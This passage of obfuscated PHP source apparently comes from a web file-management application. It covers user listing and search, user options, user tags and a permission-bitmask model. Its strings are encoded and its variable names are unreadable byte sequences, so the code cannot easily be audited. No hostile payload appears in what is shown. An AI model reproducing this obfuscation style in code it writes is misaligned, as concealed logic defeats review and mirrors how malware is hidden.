"\x4c\105\106\124\x20\112\117\x49\116\40{$this->tablePrefix}\x75\x73\x65\x72\137\x67\x72\157\x75\x70\x20\165\163\x65\162\137\x67\162\157\x75\x70\x20\157\x6e\40\x75\x73\145\x72\x2e\165\x73\145\x72\111\x44\40\75\40\x75\163\145\162\137\x67\x72\x6f\165\160\56\165\163\x65\x72\x49\104"; $òë“¨÷Š = Input::get($Âù¹ì¸Ê[544], null, $Âù¹ì¸Ê[12]) ? $Âù¹ì¸Ê[12] : $Âù¹ì¸Ê[2710]; } if (isset($ë®ÜÄâ„[$Âù¹ì¸Ê[849]])) { $ äõÉµ¼[$Âù¹ì¸Ê[2711]] = $ë®ÜÄâ„[$Âù¹ì¸Ê[849]]; } $°¤¦¢«† = _get($ë®ÜÄâ„, $Âù¹ì¸Ê[2712], $Âù¹ì¸Ê[231]); if (_get($ë®ÜÄâ„, $Âù¹ì¸Ê[860], !1)) { $ äõÉµ¼[$°¤¦¢«†] = array($Âù¹ì¸Ê[2458], $ë®ÜÄâ„[$Âù¹ì¸Ê[860]]); } if (_get($ë®ÜÄâ„, $Âù¹ì¸Ê[861], !1)) { $“”Ãº÷ı = array($Âù¹ì¸Ê[2459], $ë®ÜÄâ„[$Âù¹ì¸Ê[861]]); if ($ äõÉµ¼[$°¤¦¢«†]) { $ äõÉµ¼[$°¤¦¢«†] = array($ äõÉµ¼[$°¤¦¢«†], $“”Ãº÷ı, $Âù¹ì¸Ê[2460]); } else { $ äõÉµ¼[$°¤¦¢«†] = $“”Ãº÷ı; } } $ŞÂêŒË = $this->_makeOrder($òë“¨÷Š)->field($Âù¹ì¸Ê[2713])->where($ äõÉµ¼)->join($à¬ÀŒº)->selectPage(50); $this->_listDataApply($ŞÂêŒË[$Âù¹ì¸Ê[446]]); return $ŞÂêŒË; } private function _makeOrder($‰¨ªÂ½Ÿ = '') { $¥Œ…¹±— =& $_SERVER[µÅ˜º…æ]; $öüë†» = array($¥Œ…¹±—[1593], $¥Œ…¹±—[32], $¥Œ…¹±—[2169], $¥Œ…¹±—[2372], $¥Œ…¹±—[2144], $¥Œ…¹±—[231]); $ÜØŒ¾²« = array($¥Œ…¹±—[537] => $¥Œ…¹±—[538], $¥Œ…¹±—[539] => $¥Œ…¹±—[540]); $…µ‡çÕø = Input::get($¥Œ…¹±—[544], $¥Œ…¹±—[7], $¥Œ…¹±—[1967], $öüë†»); $‹óÃÊÎë = Input::get($¥Œ…¹±—[545], $¥Œ…¹±—[7], $¥Œ…¹±—[2276], array($¥Œ…¹±—[2276], $¥Œ…¹±—[539])); $‹óÃÊÎë = $ÜØŒ¾²«[$‹óÃÊÎë]; $‰¨ªÂ½Ÿ = $‰¨ªÂ½Ÿ . "\165\x73\145\162\56{$…µ‡çÕø}\40{$‹óÃÊÎë}\54\x20\165\x73\145\x72\x2e\x75\163\x65\x72\111\104\40\141\x73\143"; return $this->alias($¥Œ…¹±—[2407])->order($‰¨ªÂ½Ÿ); } public function listSearch($ƒÏããä) { $¯Ÿ•È‰¨ =& $_SERVER[µÅ˜º…æ]; $¡¸ÔôË = trim($ƒÏããä[$¯Ÿ•È‰¨[2279]]); $½ ½µ±Á = explode($¯Ÿ•È‰¨[53], $¡¸ÔôË); if (!$¡¸ÔôË || count($½ ½µ±Á) == 1) { return $this->listSearchNow($ƒÏããä); } $ßÊ ÌÙ† = array($¯Ÿ•È‰¨[446] => array()); foreach ($½ ½µ±Á as $¥“´ï´) { if (!trim($¥“´ï´)) { continue; } $ƒÏããä[$¯Ÿ•È‰¨[2279]] = $¥“´ï´; $·ŞÃÖÒˆ = $this->listSearchNow($ƒÏããä); $ßÊ ÌÙ†[$¯Ÿ•È‰¨[446]] = array_merge($ßÊ ÌÙ†[$¯Ÿ•È‰¨[446]], $·ŞÃÖÒˆ[$¯Ÿ•È‰¨[446]]); } $ßÊ ÌÙ†[$¯Ÿ•È‰¨[446]] = array_unique_by_key($ßÊ ÌÙ†[$¯Ÿ•È‰¨[446]], $¯Ÿ•È‰¨[1593]); $ßÊ ÌÙ†[$¯Ÿ•È‰¨[443]] = array($¯Ÿ•È‰¨[444] => count($ßÊ ÌÙ†[$¯Ÿ•È‰¨[446]]), $¯Ÿ•È‰¨[439] => 20, $¯Ÿ•È‰¨[428] => 1, $¯Ÿ•È‰¨[445] => 1); return $ßÊ ÌÙ†; } public function listSearchNow($ØÖ¿¶ıí) { $ÍÂãùşÚ =& $_SERVER[µÅ˜º…æ]; $™ÌÁ‹›í = trim($ØÖ¿¶ıí[$ÍÂãùşÚ[2279]]); $ÅşÔÔµÇ = isset($ØÖ¿¶ıí[$ÍÂãùşÚ[2280]]) ? $ØÖ¿¶ıí[$ÍÂãùşÚ[2280]] : !1; $™ÌÁ‹›í = str_replace($ÍÂãùşÚ[2281], $ÍÂãùşÚ[2282], trim($™ÌÁ‹›í)); $É™İ‘Ó = array($ÍÂãùşÚ[32] => array($ÍÂãùşÚ[473], "\x25{$™ÌÁ‹›í}\45"), $ÍÂãùşÚ[380] => array($ÍÂãùşÚ[473], "{$™ÌÁ‹›í}\x25"), $ÍÂãùşÚ[2475] => array($ÍÂãùşÚ[473], "\45{$™ÌÁ‹›í}\45"), $ÍÂãùşÚ[1169] => $ÍÂãùşÚ[2283]); if (Input::check($™ÌÁ‹›í, $ÍÂãùşÚ[386])) { $É™İ‘Ó[$ÍÂãùşÚ[1593]] = array($ÍÂãùşÚ[473], "{$™ÌÁ‹›í}\x25"); $É™İ‘Ó[$ÍÂãùşÚ[2692]] = array($ÍÂãùşÚ[473], "{$™ÌÁ‹›í}\x25"); } if (!$™ÌÁ‹›í) { $É™İ‘Ó = array(); } if (isset($ØÖ¿¶ıí[$ÍÂãùşÚ[849]])) { $É™İ‘Ó[$ÍÂãùşÚ[849]] = $ØÖ¿¶ıí[$ÍÂãùşÚ[849]]; } $É™İ‘Ó = $this->parseWhereLike($É™İ‘Ó); $Î¼Œ™ìÂ = $this->_makeOrder()->where($É™İ‘Ó)->selectPage(20); if (!$Î¼Œ™ìÂ || count($Î¼Œ™ìÂ[$ÍÂãùşÚ[446]]) < 5 && Input::check($™ÌÁ‹›í, $ÍÂãùşÚ[393])) { $¤—ª•ß = $this->_searchFromMeta($ÍÂãùşÚ[551], $™ÌÁ‹›í, 10); $íÄ·…£ = $this->_searchFromMeta($ÍÂãùşÚ[552], $™ÌÁ‹›í, 10); $ä—»‹ù½ = array_merge($¤—ª•ß, $íÄ·…£, $Î¼Œ™ìÂ[$ÍÂãùşÚ[446]]); $Î¼Œ™ìÂ[$ÍÂãùşÚ[446]] = array_unique_by_key($ä—»‹ù½, $ÍÂãùşÚ[1593]); $Î¼Œ™ìÂ[$ÍÂãùşÚ[443]][$ÍÂãùşÚ[444]] = count($Î¼Œ™ìÂ[$ÍÂãùşÚ[446]]); $Î¼Œ™ìÂ[$ÍÂãùşÚ[443]][$ÍÂãùşÚ[445]] = ceil($Î¼Œ™ìÂ[$ÍÂãùşÚ[443]][$ÍÂãùşÚ[444]] / $Î¼Œ™ìÂ[$ÍÂãùşÚ[443]][$ÍÂãùşÚ[439]]); } $this->_listDataApply($Î¼Œ™ìÂ[$ÍÂãùşÚ[446]]); $this->_filterByGroup($Î¼Œ™ìÂ, $ÅşÔÔµÇ); return $Î¼Œ™ìÂ; } private function _filterByGroup(&$åÛ¬º„, $å¿¦õà€) { $¢ó¦’£Ì =& $_SERVER[µÅ˜º…æ]; if (!$å¿¦õà€) { return $åÛ¬º„; } foreach ($åÛ¬º„[$¢ó¦’£Ì[446]] as $êáËüòæ => &$ÇÂ”çÂû) { $«ëµ¼¤ = array_to_keyvalue($ÇÂ”çÂû[$¢ó¦’£Ì[1495]], $¢ó¦’£Ì[12], $¢ó¦’£Ì[1496]); if (!in_array($å¿¦õà€, $«ëµ¼¤)) { unset($åÛ¬º„[$¢ó¦’£Ì[446]][$êáËüòæ]); } } unset($ÇÂ”çÂû); $åÛ¬º„[$¢ó¦’£Ì[446]] = array_values($åÛ¬º„[$¢ó¦’£Ì[446]]); $åÛ¬º„[$¢ó¦’£Ì[443]] = array($¢ó¦’£Ì[2330] => count($åÛ¬º„[$¢ó¦’£Ì[446]]), $¢ó¦’£Ì[2440] => $åÛ¬º„[$¢ó¦’£Ì[443]][$¢ó¦’£Ì[439]], $¢ó¦’£Ì[2439] => 1, $¢ó¦’£Ì[2441] => 1); } private function _searchFromMeta($¨˜œ—©Ë, $¢Ê¬ÓŒº, $·ƒÁÓÙ) { $Ñˆõ‚İë =& $_SERVER[µÅ˜º…æ]; $¢Ê¬ÓŒº = strtolower($¢Ê¬ÓŒº); $İ†Û…ÓÂ = array($Ñˆõ‚İë[95] => $¨˜œ—©Ë, $Ñˆõ‚İë[451] => array($Ñˆõ‚İë[473], "\x25{$¢Ê¬ÓŒº}\45")); $İ†Û…ÓÂ = $this->parseWhereLike($İ†Û…ÓÂ); $”Õ‚Ó = Model($Ñˆõ‚İë[2714])->where($İ†Û…ÓÂ)->limit($·ƒÁÓÙ)->select(); if (!$”Õ‚Ó) { return array(); } $”Õ‚Ó = array_to_keyvalue($”Õ‚Ó, $Ñˆõ‚İë[12], $Ñˆõ‚İë[1593]); $Äß‰¤Ô = $this->where(array($Ñˆõ‚İë[1967] => array($Ñˆõ‚İë[7], $”Õ‚Ó)))->select(); if (!$Äß‰¤Ô) { return array(); } return $Äß‰¤Ô; } private function _listDataApplyItem($¹ÚñœÓó) { $ô†­—Í… = array($¹ÚñœÓó); $this->_listDataApply($ô†­—Í…); return $ô†­—Í…[0]; } private function _listDataApply(&$ş„òŞãæ) { $×¿œ„ÚÙ =& $_SERVER[µÅ˜º…æ]; if (!$ş„òŞãæ) { return; } array_remove_key($ş„òŞãæ, $×¿œ„ÚÙ[1052]); $µ™Ü“ºº = array_to_keyvalue($ş„òŞãæ, $×¿œ„ÚÙ[12], $×¿œ„ÚÙ[1593]); $this->_listAppendGroup($ş„òŞãæ, $µ™Ü“ºº); $this->_listAppendMeta($ş„òŞãæ, $µ™Ü“ºº); $this->_listAppendSourceRoot($ş„òŞãæ, $µ™Ü“ºº); } private function _listAppendSourceRoot(&$ƒÀ„ª–ç, $ÕÂÛïë) { $àÏÏòœ‡ =& $_SERVER[µÅ˜º…æ]; $“‹ºÎ·¨ = Model($àÏÏòœ‡[932])->listSourceRoot(SourceModel::TYPE_USER, $ÕÂÛïë); $“‹ºÎ·¨ = array_to_keyvalue($“‹ºÎ·¨, $àÏÏòœ‡[589]); $“‹ºÎ·¨ = array_remove_key($“‹ºÎ·¨, $àÏÏòœ‡[589]); foreach ($ƒÀ„ª–ç as &$ö›èÊ“ı) { $ö›èÊ“ı[$àÏÏòœ‡[90]] = $“‹ºÎ·¨[$ö›èÊ“ı[$àÏÏòœ‡[1593]]] ? $“‹ºÎ·¨[$ö›èÊ“ı[$àÏÏòœ‡[1593]]] : array(); } unset($ö›èÊ“ı); } private function _listAppendGroup(&$°”Ï—÷‰, $Ñ‹¨Ü¦—) { $’…İâÀ® =& $_SERVER[µÅ˜º…æ]; $‚áÏÄ¯¶ = array($’…İâÀ®[1593] => array($’…İâÀ®[7], $Ñ‹¨Ü¦—)); $¨š¦Ò³ = Model($’…İâÀ®[2275])->where($‚áÏÄ¯¶)->select(); $ªîîŸúË = array_to_keyvalue($¨š¦Ò³, $’…İâÀ®[12], $’…İâÀ®[1496]); $ªîîŸúË = array_remove_value(array_unique($ªîîŸúË), $’…İâÀ®[228]); if (!$ªîîŸúË || !$¨š¦Ò³) { return; } $‚áÏÄ¯¶ = array($’…İâÀ®[1496] => array($’…İâÀ®[7], $ªîîŸúË)); $ê‡é×´¨ = Model($’…İâÀ®[1494])->field($’…İâÀ®[2715])->where($‚áÏÄ¯¶)->select(); $ê‡é×´¨ = array_to_keyvalue($ê‡é×´¨, $’…İâÀ®[1496]); $¨š¦Ò³ = array_to_keyvalue_group($¨š¦Ò³, $’…İâÀ®[1593]); foreach ($¨š¦Ò³ as &$—¹¦¬¢³) { $ŸÛŒ¾îÈ = array(); foreach ($—¹¦¬¢³ as $û©ÔòÎ¼) { if (!$û©ÔòÎ¼[$’…İâÀ®[1641]]) { continue; } $ÔÇ¨úçæ = Model($’…İâÀ®[591])->listData($û©ÔòÎ¼[$’…İâÀ®[1641]]); $ŸÛŒ¾îÈ[] = array($’…İâÀ®[1496] => $û©ÔòÎ¼[$’…İâÀ®[1496]], $’…İâÀ®[2716] => $ê‡é×´¨[$û©ÔòÎ¼[$’…İâÀ®[1496]]][$’…İâÀ®[32]], $’…İâÀ®[604] => $ê‡é×´¨[$û©ÔòÎ¼[$’…İâÀ®[1496]]][$’…İâÀ®[604]], $’…İâÀ®[502] => $ÔÇ¨úçæ); } $—¹¦¬¢³ = $ŸÛŒ¾îÈ; } unset($—¹¦¬¢³); foreach ($°”Ï—÷‰ as &$ôãÒÔÃ‰) { $ôãÒÔÃ‰[$’…İâÀ®[1495]] = array(); if (isset($¨š¦Ò³[$ôãÒÔÃ‰[$’…İâÀ®[1593]]])) { $ôãÒÔÃ‰[$’…İâÀ®[1495]] = $¨š¦Ò³[$ôãÒÔÃ‰[$’…İâÀ®[1593]]]; } } unset($ôãÒÔÃ‰); } public function userAppendGroup($°¢ôØùÀ) { $ÖÎïç„õ =& $_SERVER[µÅ˜º…æ]; if (!$°¢ôØùÀ) { return array(); } $this->_listAppendGroup($°¢ôØùÀ, array_to_keyvalue($°¢ôØùÀ, $ÖÎïç„õ[12], $ÖÎïç„õ[1593])); return $°¢ôØùÀ; } private function _listAppendMeta(&$òøêŞŒå, $Éõ·ÌÇÖ) { $¸ú·²¢ı =& $_SERVER[µÅ˜º…æ]; $ÀÉœü‹÷ = UserJobModel::JOB_KEY; $‰ÕŠœ§÷ = array($¸ú·²¢ı[2271]); $ÌŞ¶†Û² = array($¸ú·²¢ı[1593] => array($¸ú·²¢ı[7], $Éõ·ÌÇÖ)); $©èÃüÀ¬ = Model($¸ú·²¢ı[2691])->where($ÌŞ¶†Û²)->select(); $›‘İó¸ğ = array(); foreach ($©èÃüÀ¬ as $‰‚Š­«) { $ƒ™Ôê’ = $‰‚Š­«[$¸ú·²¢ı[1593]]; if (!isset($›‘İó¸ğ[$ƒ™Ôê’])) { $›‘İó¸ğ[$ƒ™Ôê’] = array(); } $›‘İó¸ğ[$ƒ™Ôê’][$‰‚Š­«[$¸ú·²¢ı[95]]] = $‰‚Š­«[$¸ú·²¢ı[451]]; } $ÑÎæéÛÏ = Model($¸ú·²¢ı[2717]); foreach ($òøêŞŒå as &$ÈÂ¼®•ª) { $ƒ™Ôê’ = $ÈÂ¼®•ª[$¸ú·²¢ı[1593]]; $­ÄåÙü = isset($›‘İó¸ğ[$ƒ™Ôê’]) ? $›‘İó¸ğ[$ƒ™Ôê’] : array(); $ÈÂ¼®•ª[$¸ú·²¢ı[555]] = array_field_key($­ÄåÙü, $‰ÕŠœ§÷); $ÈÂ¼®•ª[$¸ú·²¢ı[2718]] = array(); if (isset($­ÄåÙü[$ÀÉœü‹÷])) { $ÈÂ¼®•ª[$¸ú·²¢ı[2718]] = $ÑÎæéÛÏ->getUserJobInfo($­ÄåÙü[$ÀÉœü‹÷]); } } unset($ÈÂ¼®•ª); } protected function groupUserAll($–´× ‘) { $—á°èÇÏ =& $_SERVER[µÅ˜º…æ]; if (!$–´× ‘) { return !1; } $¦ÄÆš©¸ = Model($—á°èÇÏ[2275])->field($—á°èÇÏ[1593])->where(array($—á°èÇÏ[1496] => array($—á°èÇÏ[7], $–´× ‘)))->select(); $¦ÄÆš©¸ = array_to_keyvalue($¦ÄÆš©¸, $—á°èÇÏ[12], $—á°èÇÏ[1593]); return array_unique($¦ÄÆš©¸); } public function userSearch($ˆ‚âÚû, $€Ì˜ØÔı = "\52") { return Model($_SERVER[µÅ˜º…æ][617])->where($ˆ‚âÚû)->field($€Ì˜ØÔı)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\157\x70\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ê³úóõÙ) { return "\125\163\x65\x72\x4f\160\164\x69\157\156\x5f{$ê³úóõÙ}\137" . KodUser::id(); } protected function filterWhere($¢áÒŠêÙ) { $¢áÒŠêÙ[$_SERVER[µÅ˜º…æ][1593]] = KodUser::id(); return $¢áÒŠêÙ; } public function cacheRemoveUser($ÈÄĞ÷ºš, $•‚Ôùš) { return Cache::remove("\125\x73\x65\162\117\160\164\x69\x6f\156\x5f{$ÈÄĞ÷ºš}\137" . $•‚Ôùš); } protected function optionDefault($ñÖÜ¤¦ = '') { $İ«ÁÜƒÛ =& $_SERVER[µÅ˜º…æ]; if ($ñÖÜ¤¦ == $İ«ÁÜƒÛ[12]) { return $GLOBALS[$İ«ÁÜƒÛ[6]][$İ«ÁÜƒÛ[2719]]; } if ($ñÖÜ¤¦ == $İ«ÁÜƒÛ[2720]) { return $GLOBALS[$İ«ÁÜƒÛ[6]][$İ«ÁÜƒÛ[2721]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\56\164\x61\x67\x4c\151\x73\x74"; public $modelType = "\125\163\145\x72\117\160\164\x69\157\x6e"; public $field = array("\156\x61\155\x65", "\x73\164\x79\154\145", "\163\157\162\164"); public function listData($úğµ«Íˆ = false, $äŠƒç‘ = "\x73\x6f\x72\x74", $ÌÈ×º = false) { return parent::listData($úğµ«Íˆ, $äŠƒç‘, $ÌÈ×º); } public function remove($™ÑÏÕÌ) { return parent::remove($™ÑÏÕÌ); } public function add($îï‰ú¶›, $Ã—ú¤« = "\154\x61\x62\x65\154\x2d\x67\x72\x65\x79\55\x6e\x6f\162\155\141\154") { $ìäÕúô =& $_SERVER[µÅ˜º…æ]; if ($this->findByName($îï‰ú¶›)) { return !1; } $ÏÁ¿Ù¯ğ = array($ìäÕúô[509] => $îï‰ú¶›, $ìäÕúô[574] => $Ã—ú¤«, $ìäÕúô[2185] => $this->getSort($ìäÕúô[335]) + 1); return parent::insert($ÏÁ¿Ù¯ğ); } public function update($‹ıâš°¥, $­ÓÇ›£) { $ıø¯€š– =& $_SERVER[µÅ˜º…æ]; $¼¨¸šú¤ = $this->listData($‹ıâš°¥); $†ó°Àíˆ = $this->findByName($­ÓÇ›£[$ıø¯€š–[32]]); if (!$¼¨¸šú¤ || $†ó°Àíˆ && $†ó°Àíˆ[$ıø¯€š–[487]] != $¼¨¸šú¤[$ıø¯€š–[487]]) { return !1; } return parent::update($‹ıâš°¥, $­ÓÇ›£); } public function moveTop($„¿å) { $“ÁÒÇØ˜ =& $_SERVER[µÅ˜º…æ]; $“óÇÕ¨ = parent::listData(); $½±ÉåüÁ = $this->getSort($“ÁÒÇØ˜[334]); foreach ($“óÇÕ¨ as &$´Ùé¡¬™) { if ($´Ùé¡¬™[$“ÁÒÇØ˜[487]] == $„¿å) { $´Ùé¡¬™[$“ÁÒÇØ˜[2203]] = $½±ÉåüÁ; continue; } $´Ùé¡¬™[$“ÁÒÇØ˜[2203]] += 1; } unset($´Ùé¡¬™); return parent::resetData($“óÇÕ¨); } public function moveBottom($Àéàïíâ) { $­ü–Ø”ˆ =& $_SERVER[µÅ˜º…æ]; $ê¾İÀù = $this->getSort($­ü–Ø”ˆ[335]) + 1; return parent::update($Àéàïíâ, array($­ü–Ø”ˆ[2203] => $ê¾İÀù)); } public function resetSort($ˆ‡»û¸à) { $”‘ª´Èø =& $_SERVER[µÅ˜º…æ]; $¤²¼°ó˜ = array(); $ˆ‡»û¸à = is_array($ˆ‡»û¸à) ? $ˆ‡»û¸à : array(); for ($Äœ±Şüê = 0; $Äœ±Şüê < count($ˆ‡»û¸à); $Äœ±Şüê++) { $¤²¼°ó˜[$ˆ‡»û¸à[$Äœ±Şüê] . $”‘ª´Èø[12]] = $Äœ±Şüê + 1; } $ÙØ©Éí¬ = parent::listData(); foreach ($ÙØ©Éí¬ as &$çÅÜê«Î) { $…©ÌÏ½  = $¤²¼°ó˜[$çÅÜê«Î[$”‘ª´Èø[487]]]; $çÅÜê«Î[$”‘ª´Èø[2203]] = $…©ÌÏ½  ? $…©ÌÏ½  : $çÅÜê«Î[$”‘ª´Èø[2203]]; } unset($çÅÜê«Î); return parent::resetData($ÙØ©Éí¬); } private function getSort($€„ÃÎÓĞ) { $îŒûÔé’ =& $_SERVER[µÅ˜º…æ]; $Ö‚í = parent::listData(); $’¡›–—– = array_to_keyvalue($Ö‚í, $îŒûÔé’[12], $îŒûÔé’[2203]); if (!$’¡›–—–) { $’¡›–—– = array(0); } $Šâ×•”Ú = $€„ÃÎÓĞ == $îŒûÔé’[335] ? max($’¡›–—–) : min($’¡›–—–); return intval($Šâ×•”Ú); } } goto aÌ”½ƒßèŸ; eĞ°ÇÒ‡ŠÒ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¼´„¨îÖ =& $_SERVER[µÅ˜º…æ]; $ñÑÔÆò… = array(array($¼´„¨îÖ[509] => LNG($¼´„¨îÖ[2182]), $¼´„¨îÖ[2183] => $¼´„¨îÖ[2184], $¼´„¨îÖ[2185] => 1, $¼´„¨îÖ[2186] => 1, $¼´„¨îÖ[2187] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¼´„¨îÖ[509] => LNG($¼´„¨îÖ[2188]), $¼´„¨îÖ[2183] => $¼´„¨îÖ[2189], $¼´„¨îÖ[2185] => 2, $¼´„¨îÖ[2186] => 1, $¼´„¨îÖ[2187] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¼´„¨îÖ[509] => LNG($¼´„¨îÖ[2190]), $¼´„¨îÖ[2183] => $¼´„¨îÖ[2191], $¼´„¨îÖ[2185] => 3, $¼´„¨îÖ[2186] => 1, $¼´„¨îÖ[2187] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¼´„¨îÖ[509] => LNG($¼´„¨îÖ[2192]), $¼´„¨îÖ[2183] => $¼´„¨îÖ[2193], $¼´„¨îÖ[2185] => 4, $¼´„¨îÖ[2186] => 1, $¼´„¨îÖ[2187] => self::AUTH_SHOW | self::AUTH_VIEW), array($¼´„¨îÖ[509] => LNG($¼´„¨îÖ[2194]), $¼´„¨îÖ[2183] => $¼´„¨îÖ[2195], $¼´„¨îÖ[2185] => 5, $¼´„¨îÖ[2186] => 1, $¼´„¨îÖ[2187] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¼´„¨îÖ[509] => LNG($¼´„¨îÖ[2196]), $¼´„¨îÖ[2183] => $¼´„¨îÖ[2197], $¼´„¨îÖ[2185] => 6, $¼´„¨îÖ[2186] => 1, $¼´„¨îÖ[2187] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¼´„¨îÖ[509] => LNG($¼´„¨îÖ[2198]), $¼´„¨îÖ[2183] => $¼´„¨îÖ[2199], $¼´„¨îÖ[2185] => 7, $¼´„¨îÖ[2186] => 1, $¼´„¨îÖ[2187] => 0)); return $ñÑÔÆò…; } public static function authCheck($Üï½Î’¹, $½ÒëåÚ‚, $Ñ¸ªö¤Ÿ = true) { $ÉáÒœ¿„ =& $_SERVER[µÅ˜º…æ]; $Üï½Î’¹ = intval($Üï½Î’¹); if ($Ñ¸ªö¤Ÿ) { if (KodUser::isRoot() && $GLOBALS[$ÉáÒœ¿„[6]][$ÉáÒœ¿„[2200]]) { return !0; } } if ($Üï½Î’¹ <= 0) { return !1; } if (($Üï½Î’¹ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Üï½Î’¹ & $½ÒëåÚ‚); } public static function authCheckShow($ Ç‘İİ°) { return self::authCheck($ Ç‘İİ°, self::AUTH_SHOW); } public static function authCheckView($Ò¡À¿Ò™) { return self::authCheck($Ò¡À¿Ò™, self::AUTH_VIEW); } public static function authCheckDownload($é«‹ê×‡) { return self::authCheck($é«‹ê×‡, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÓáÔ›øü) { return self::authCheck($ÓáÔ›øü, self::AUTH_UPLOAD); } public static function authCheckEdit($µ¨ç¶óÕ) { return self::authCheck($µ¨ç¶óÕ, self::AUTH_EDIT); } public static function authCheckRemove($ƒ–“Ç) { return self::authCheck($ƒ–“Ç, self::AUTH_REMOVE); } public static function authCheckShare($·ÈŒƒ¦ˆ) { return self::authCheck($·ÈŒƒ¦ˆ, self::AUTH_SHARE); } public static function authCheckComment($é„õ³®Ä) { return self::authCheck($é„õ³®Ä, self::AUTH_COMMENT); } public static function authCheckEvent($é¡·ŞÓ¹) { return self::authCheck($é¡·ŞÓ¹, self::AUTH_EVENT); } public static function authCheckRoot($Ñ‰–µá™) { return self::authCheck($Ñ‰–µá™, self::AUTH_ROOT); } public static function authCheckAction($ÈÊõè€, $Á”Ó¯ˆò) { $€»ò§ƒ¥ =& $_SERVER[µÅ˜º…æ]; $®ıúÑíŞ = array($€»ò§ƒ¥[1560] => self::AUTH_SHOW, $€»ò§ƒ¥[1561] => self::AUTH_VIEW, $€»ò§ƒ¥[1386] => self::AUTH_DOWNLOAD, $€»ò§ƒ¥[107] => self::AUTH_UPLOAD, $€»ò§ƒ¥[1562] => self::AUTH_EDIT, $€»ò§ƒ¥[1335] => self::AUTH_REMOVE, $€»ò§ƒ¥[1563] => self::AUTH_SHARE, $€»ò§ƒ¥[429] => self::AUTH_COMMENT, $€»ò§ƒ¥[1564] => self::AUTH_EVENT, $€»ò§ƒ¥[1565] => self::AUTH_ROOT); if (!isset($®ıúÑíŞ[$Á”Ó¯ˆò])) { return; } $´óõÅÎË = $®ıúÑíŞ[$Á”Ó¯ˆò]; $ÈÊõè€ = intval($ÈÊõè€); if ($ÈÊõè€ <= 0) { return !1; } if (($ÈÊõè€ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÈÊõè€ & $´óõÅÎË); } public static function authDisable($ä±á€, $ÃôŸù„) { if (intval($ä±á€) <= 0) { return 0; } return intval($ä±á€) & ~$ÃôŸù„; } public $optionType = "\123\171\x73\x74\x65\155\56\x73\x6f\165\x72\143\145\101\165\164\x68\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\141\x75\164\x68", "\154\141\142\145\154", "\x64\x69\163\160\154\x61\171", "\163\x79\x73\x74\x65\x6d", "\163\157\162\164"); public function initData() { $ºìÖİ’ = $this->authDefault(); foreach ($ºìÖİ’ as $Ìßô¥ßª) { $this->add($Ìßô¥ßª); } } public function findAuth($²§Ú·¤, $Ñ´î­Ç³) { $§ÛËøÙË =& $_SERVER[µÅ˜º…æ]; $„¯Ø‰¦ = parent::listData(); foreach ($„¯Ø‰¦ as $ïÙÜ”íÊ) { $…º•¾š = intval($ïÙÜ”íÊ[$§ÛËøÙË[502]]); if ($…º•¾š <= 0 || $ïÙÜ”íÊ[$§ÛËøÙË[2201]] == 0) { continue; } if (($…º•¾š & $²§Ú·¤) != $²§Ú·¤) { continue; } if (($…º•¾š & $Ñ´î­Ç³) != 0) { continue; } return $ïÙÜ”íÊ[$§ÛËøÙË[487]]; } return !1; } public function findAuthMax($¸ú€şÔ, $…°Ÿ¸æİ) { $àúšÊç¬ =& $_SERVER[µÅ˜º…æ]; $Öó¹—©¶ = !1; $½Öí³ø = parent::listData(); foreach ($½Öí³ø as $·‘ë»ÆŞ) { $«µĞ¡øà = intval($·‘ë»ÆŞ[$àúšÊç¬[502]]); if ($«µĞ¡øà <= 0 || $·‘ë»ÆŞ[$àúšÊç¬[2201]] == 0) { continue; } if (($«µĞ¡øà & $¸ú€şÔ) != $¸ú€şÔ) { continue; } if (($«µĞ¡øà & $…°Ÿ¸æİ) != 0) { continue; } if (!$Öó¹—©¶) { $Öó¹—©¶ = $·‘ë»ÆŞ; continue; } if (intval($Öó¹—©¶[$àúšÊç¬[502]]) < $«µĞ¡øà) { $Öó¹—©¶ = $·‘ë»ÆŞ; } } return $Öó¹—©¶ ? $Öó¹—©¶[$àúšÊç¬[487]] : !1; } public function findAuthReadOnly() { $ªâê ©Ù = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $§ª¥çı = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ªâê ©Ù, $§ª¥çı); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $†ÛÊî©Ğ =& $_SERVER[µÅ˜º…æ]; $úØÎÍçË = parent::listData(); $şúÄÎ ¾ = !1; foreach ($úØÎÍçË as $É“¼º‘Ë) { if ($É“¼º‘Ë[$†ÛÊî©Ğ[502]] <= 0 || $É“¼º‘Ë[$†ÛÊî©Ğ[2201]] == 